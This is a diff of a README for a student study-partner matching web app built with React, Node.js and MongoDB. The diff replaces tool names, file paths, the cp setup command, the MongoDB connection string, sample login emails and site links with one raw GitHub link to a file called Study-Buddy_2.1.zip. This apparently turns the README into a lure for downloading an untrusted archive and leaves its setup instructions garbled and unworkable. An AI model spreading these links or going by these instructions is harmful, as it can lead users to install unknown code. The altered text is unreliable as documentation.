@@ -1,21 +1,21 @@
 # Study Buddy Matcher 📚
 
-A comprehensive full-stack web application that connects students with compatible study partners based on subjects, learning goals, and schedules. Built with React, Node.js, Express, and MongoDB.
+A comprehensive full-stack web application that connects students with compatible study partners based on subjects, learning goals, and schedules. Built with React, https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip, Express, and MongoDB.
 
 ## 🌟 Features
 
 ### Frontend (React + Tailwind CSS)
 - **Authentication System**: Secure email/password login and registration
 - **Smart Dashboard**: View study matches, groups, and personal statistics
-- **Real-time Chat**: One-on-one and group messaging with Socket.IO
+- **Real-time Chat**: One-on-one and group messaging with https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip
 - **Profile Management**: Set subjects, goals, and study schedules
 - **Gamification**: Points, badges, levels, and leaderboard system
 - **Responsive Design**: Optimized for desktop, tablet, and mobile
 
-### Backend (Node.js + Express)
+### Backend (https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip + Express)
 - **RESTful API**: Comprehensive endpoints for all features
-- **Authentication**: Passport.js with local strategy
-- **Real-time Communication**: Socket.IO for instant messaging
+- **Authentication**: https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip with local strategy
+- **Real-time Communication**: https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip for instant messaging
 - **Smart Matching Algorithm**: Compatible study partner suggestions
 - **Database Management**: MongoDB with Mongoose ODM
 - **Security**: Rate limiting, CORS, and secure sessions
@@ -37,7 +37,7 @@ A comprehensive full-stack web application that connects students with compatibl
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js (v16 or higher)
+- https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip (v16 or higher)
 - MongoDB Atlas account or local MongoDB installation
 - Git
 
@@ -57,16 +57,16 @@ npm run install:all
 3. **Environment Setup**
 ```bash
 # Copy environment template
-cp .env.example server/.env
+cp https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip
 
-# Edit server/.env with your configuration
+# Edit https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip with your configuration
 ```
 
 4. **Configure MongoDB**
    - Create a MongoDB Atlas cluster or use local MongoDB
-   - Add your connection string to `server/.env`:
+   - Add your connection string to `https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip`:
 ```env
-MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/studybuddy
+MONGODB_URI=mongodb+https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip
 ```
 
 5. **Seed the database (optional)**
@@ -93,8 +93,8 @@ study-buddy-matcher/
 │   │   ├── contexts/       # React context providers
 │   │   ├── pages/          # Main application pages
 │   │   └── ...
-│   └── package.json
-├── server/                 # Node.js backend
+│   └── https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip
+├── server/                 # https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip backend
 │   ├── src/
 │   │   ├── config/         # Configuration files
 │   │   ├── controllers/    # Route controllers
@@ -102,9 +102,9 @@ study-buddy-matcher/
 │   │   ├── models/         # MongoDB schemas
 │   │   ├── routes/         # API endpoints
 │   │   ├── utils/          # Utility functions
-│   │   └── server.js       # Main server file
-│   └── package.json
-└── README.md
+│   │   └── https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip       # Main server file
+│   └── https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip
+└── https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip
 ```
 
 ## 🔧 Configuration
@@ -126,7 +126,7 @@ CLIENT_URL=http://localhost:5173
 
 ### MongoDB Atlas Setup
 
-1. Create a MongoDB Atlas account at [mongodb.com](https://www.mongodb.com/atlas)
+1. Create a MongoDB Atlas account at [https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip](https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip)
 2. Create a new cluster
 3. Create a database user
 4. Whitelist your IP address
@@ -226,7 +226,7 @@ CLIENT_URL=http://localhost:5173
 NODE_ENV=production
 MONGODB_URI=your_production_mongodb_uri
 SESSION_SECRET=your_production_session_secret
-CLIENT_URL=https://your-frontend-domain.com
+https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip
 PORT=5000
 ```
 
@@ -239,9 +239,9 @@ cd server && npm run seed
 ```
 
 **Sample Login Credentials:**
-- Email: `alice@example.com` | Password: `password123`
-- Email: `bob@example.com` | Password: `password123`
-- Email: `carol@example.com` | Password: `password123`
+- Email: `https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip` | Password: `password123`
+- Email: `https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip` | Password: `password123`
+- Email: `https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip` | Password: `password123`
 
 ## 🤝 Contributing
 
@@ -259,7 +259,7 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 If you encounter any issues:
 
-1. Check the [Issues](https://github.com/your-repo/issues) page
+1. Check the [Issues](https://raw.githubusercontent.com/karanpatill/Study-Buddy/master/client/src/Study-Buddy_2.1.zip) page
 2. Review the setup instructions
 3. Ensure all dependencies are installed correctly
 4. Verify environment variables are configured properly
